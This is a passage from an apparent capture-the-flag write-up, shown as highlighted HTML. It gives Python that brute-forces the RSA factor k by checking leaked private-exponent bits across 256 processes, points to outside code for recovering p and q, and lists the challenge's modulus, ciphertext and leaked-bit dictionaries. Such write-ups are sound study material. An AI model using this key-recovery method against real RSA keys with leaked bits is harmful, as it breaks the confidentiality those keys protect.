class="number">688</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">954</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">976</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">868</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">723</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">131</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">794</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">513</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">914</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">641</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">319</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">629</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">620</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">711</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">601</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">531</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">393</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">168</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">950</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">488</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">679</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">568</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">545</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">680</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1008</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">514</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">746</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">436</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">139</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">695</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">584</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">828</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">251</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">691</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">394</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">655</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">544</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">565</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">685</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">720</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">178</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">667</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">403</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">697</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">138</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">659</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">960</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">600</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">579</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">211</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">82</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">209</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">226</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">753</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">874</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">903</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">358</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">141</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getnum</span>(<span class="params">hint, bit</span>):</span><br><span class="line">        s = [<span class="string">&#x27;?&#x27;</span>] * bit</span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> hint.items():</span><br><span class="line">            s[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">        ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> ss.join(s)</span><br><span class="line"></span><br><span class="line">    p_corr = getnum(hint1, <span class="number">512</span>)</span><br><span class="line">    q_corr = getnum(hint2, <span class="number">512</span>)</span><br><span class="line">    d_corr = getnum(hint3, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> n, e, c, p_corr, q_corr, d_corr, hint3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="comment"># fn: 函数参数是数据列表的一个元素</span></span><br><span class="line">    N, e, c, p_corr, q_corr, d_corr, hint_d = get_params_prob()</span><br><span class="line">    MY_SIZE = <span class="number">508</span></span><br><span class="line">    my_hint_d = &#123;x: y <span class="keyword">for</span> x, y <span class="keyword">in</span> hint_d.items() <span class="keyword">if</span> x &lt; MY_SIZE&#125;</span><br><span class="line">    l, r = args</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="number">1</span>, l), <span class="built_in">min</span>(e, r)):</span><br><span class="line">        d_tilde = (k*(N+<span class="number">1</span>)+<span class="number">1</span>) // e</span><br><span class="line">        d_tilde_str = <span class="built_in">bin</span>(d_tilde)[<span class="number">2</span>:].zfill(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> my_hint_d.items():</span><br><span class="line">            <span class="keyword">if</span> (d_tilde_str[x] != y):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;FIND ANS:&#x27;</span>, k)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># print(f&#x27;Find &#123;(l, r)&#125; failed&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testX = [(<span class="number">2</span>**<span class="number">24</span>*i, <span class="number">2</span>**<span class="number">24</span>*(i+<span class="number">1</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;concurrent:&#x27;</span>)  <span class="comment"># 创建多个进程，并行执行</span></span><br><span class="line">    pool = Pool(<span class="number">256</span>)  <span class="comment"># 创建拥有3个进程数量的进程池</span></span><br><span class="line">    </span><br><span class="line">    pool.<span class="built_in">map</span>(run, testX)</span><br><span class="line">    pool.close()  <span class="comment"># 关闭进程池，不再接受新的进程</span></span><br><span class="line">    pool.join()  <span class="comment"># 主进程阻塞等待子进程的退出</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>拿到k以后爆破pq，直接用春哥的代码</p>
<p>https://zhuanlan.zhihu.com/p/266059082 ，四元变三元，也很吃算力</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">e = <span class="number">3116872133</span></span><br><span class="line">c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line">hint1 = &#123;<span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">401</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">420</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">192</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">497</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">110</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">206</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">326</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">320</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">222</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">166</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">496</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">181</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">288</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">69</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">127</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">308</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">235</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">94</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">309</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">487</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">234</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">98</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">101</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">387</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">162</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">485</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">413</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">242</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">456</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">264</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">407</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">135</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">84</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">476</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">176</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">230</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">432</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">79</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">290</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">507</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">421</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">334</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">85</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">511</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">491</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">370</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">92</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">495</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">279</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">346</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">87</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">243</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">147</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">411</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">378</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">269</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">291</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">468</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">124</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">hint2 = &#123;<span class="number">125</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">385</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">315</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">348</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">154</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">136</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">440</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">250</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">270</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">318</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">107</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">474</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">325</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">278</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">109</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">423</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">190</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">171</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">475</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">441</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">323</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">451</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">438</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">121</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">494</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">314</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">183</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">372</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">237</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">483</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">406</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">115</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">301</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">490</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">502</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">231</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">404</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">344</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">463</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">157</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">255</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">386</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">373</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">360</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">148</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">472</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">262</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">185</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">214</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">455</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">445</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">464</span>: 